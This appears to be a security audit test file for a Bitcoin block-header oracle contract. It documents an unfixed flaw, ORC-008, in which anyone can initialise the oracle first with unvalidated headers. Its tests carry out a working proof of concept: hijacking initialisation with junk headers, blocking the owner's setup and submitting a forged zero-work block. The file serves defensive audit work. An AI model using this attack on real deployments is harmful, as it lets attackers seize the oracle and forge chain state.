// PENTEST · ORC-008 (MEDIUM) — `initializeBlockHeaderOracle` is permissionless and validates
// nothing, so whoever calls it first on a fresh deployment owns the oracle
// ----------------------------------------------------------------------------
// STATUS: NOT YET FIXED — the `DEMONSTRATES` tests assert today's behaviour and must be
// flipped by the fix commit (owner-only + header validation; init inside the Safe MultiSend).
//
// Attack scenario
//
//   The documented deployment cuts the facets in from the Safe and initialises the oracle in a
//   LATER, separate EOA transaction (scripts/seed-oracle.js:55; the MultiSend in
//   scripts/deploy-safe-owned.js:221-278 does not initialise it). Anyone watching for the cut
//   back-runs it with `initializeBlockHeaderOracle(<17 arbitrary headers>, <any height>)`:
//     - no access control: the only guard is `currentBlockHeight != 0`;
//     - no validation: linkage, PoW and nBits of the 17 headers are never checked, so the
//       attacker also picks the baseline target every later PoW check builds on;
//     - no reset: the honest initialisation then reverts AlreadyInitialized, and only a
//       diamondCut `_init` (or a redeploy) can undo it.
//
// Root cause
//
//   contracts/facets/DoefinV1BlockHeaderOracleFacet.sol:69-91.
//
// Impact
//
//   On a fresh deployment the attacker owns the oracle from block one (free headers; honest
//   headers never link). The mainnet Diamond is already initialised and not exposed.

const path = require("path");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const sc = require("../utils/syntheticChain.js");
const { snapshotFixture, deployOracleAuditDiamond, submitEach, loadRealHeaders } = require("../utils/oracleAuditFixture.js");

const REAL = loadRealHeaders(path.join(__dirname, "../data/reorg_index_underflow/blocks-mainchain-967110-967160.json"));
const INIT_FROM = 967110; // the height the deployer intends to seed
const TIP = INIT_FROM + sc.NUM_OF_BLOCK_HEADERS - 1;

/** 17 headers that link to nothing, carry no proof of work, and end on the attack target. */
function garbageHeaders() {
  return Array.from({ length: sc.NUM_OF_BLOCK_HEADERS }, (_, i) => {
    const h = {
      prevBlockHash: "0x" + sc.sha256(Buffer.from(`orc008-unlinked-prev-${i}`)).toString("hex"),
      merkleRootHash: "0x" + sc.sha256(Buffer.from(`orc008-merkle-${i}`)).toString("hex"),
      blockNumber: INIT_FROM + i,
      version: 0x20000000,
      timestamp: 1_000_000_000 + i * 7, // arbitrary
      nBits: i === sc.NUM_OF_BLOCK_HEADERS - 1 ? sc.NBITS.ATTACK : 0x1d00ffff + i, // arbitrary, last one trivial
      nonce: 0, // no work at all
    };
    h.blockHash = sc.blockHash(h);
    return h;
  });
}

const loadFresh = snapshotFixture(deployOracleAuditDiamond);

describe("PENTEST · ORC-008 (MEDIUM) — permissionless, unvalidated oracle initialisation", function () {
  this.timeout(300_000);

  it("CONTROL — the owner initialises with 17 real linked headers and the next real header is accepted", async function () {
    const ctx = await loadFresh();
    await ctx.oracle.connect(ctx.signers.owner).initializeBlockHeaderOracle(REAL.headers(INIT_FROM, TIP), INIT_FROM);
    await submitEach(ctx, REAL.headers(TIP + 1, TIP + 1));
    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 1);
  });

  it("DEMONSTRATES — a non-owner initialises a fresh Diamond with 17 unlinked, unmined headers", async function () {
    const ctx = await loadFresh();
    const { attacker, owner } = ctx.signers;
    const ownership = await ethers.getContractAt("OwnershipFacet", ctx.diamondAddress);
    expect(await ownership.owner()).to.equal(owner.address);
    expect(attacker.address).to.not.equal(owner.address);

    const junk = garbageHeaders();
    for (let i = 1; i < junk.length; i++) expect(junk[i].prevBlockHash).to.not.equal(junk[i - 1].blockHash); // unlinked
    expect(junk.every((h) => !sc.passesBitcoinPow(h))).to.equal(true); // none carries valid PoW

    await ctx.oracle.connect(attacker).initializeBlockHeaderOracle(junk.map(sc.toContract), INIT_FROM);

    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP);
    const latest = await ctx.oracle.getLatestBlockHeader();
    expect(latest.blockHash).to.equal(junk[junk.length - 1].blockHash);
    expect(latest.nBits).to.equal(sc.NBITS.ATTACK);
  });

  it("DEMONSTRATES — after the hijack the owner's honest initialisation reverts AlreadyInitialized (no reset path)", async function () {
    const ctx = await loadFresh();
    await ctx.oracle.connect(ctx.signers.attacker).initializeBlockHeaderOracle(garbageHeaders().map(sc.toContract), INIT_FROM);

    await expect(
      ctx.oracle.connect(ctx.signers.owner).initializeBlockHeaderOracle(REAL.headers(INIT_FROM, TIP), INIT_FROM)
    ).to.be.revertedWith("AlreadyInitialized()");
  });

  it("DEMONSTRATES — the hijacked oracle accepts a zero-work forged header and rejects the real next block (PrevBlockHashMismatch)", async function () {
    const ctx = await loadFresh();
    const junk = garbageHeaders();
    await ctx.oracle.connect(ctx.signers.attacker).initializeBlockHeaderOracle(junk.map(sc.toContract), INIT_FROM);

    await expect(ctx.oracle.submitNextBlock(REAL.byHeight[TIP + 1])).to.be.revertedWith("BlockHeaderOracle_PrevBlockHashMismatch()");

    const { header: forged, tries } = sc.mine(
      {
        prevBlockHash: junk[junk.length - 1].blockHash,
        merkleRootHash: sc.merkleFor("orc008-forged", TIP + 1),
        blockNumber: TIP + 1,
        version: 0x20000000,
        timestamp: junk[junk.length - 1].timestamp + 1,
        nBits: sc.NBITS.ATTACK,
      },
      (h) => h < sc.contractTarget(sc.NBITS.ATTACK)
    );
    expect(tries).to.be.at.most(2); // no proof of work needed
    await ctx.oracle.connect(ctx.signers.attacker).submitNextBlock(sc.toContract(forged));
    expect(await ctx.oracle.getCurrentBlockHeight()).to.equal(TIP + 1);
    expect((await ctx.oracle.getLatestBlockHeader()).blockHash).to.equal(forged.blockHash);
  });
});
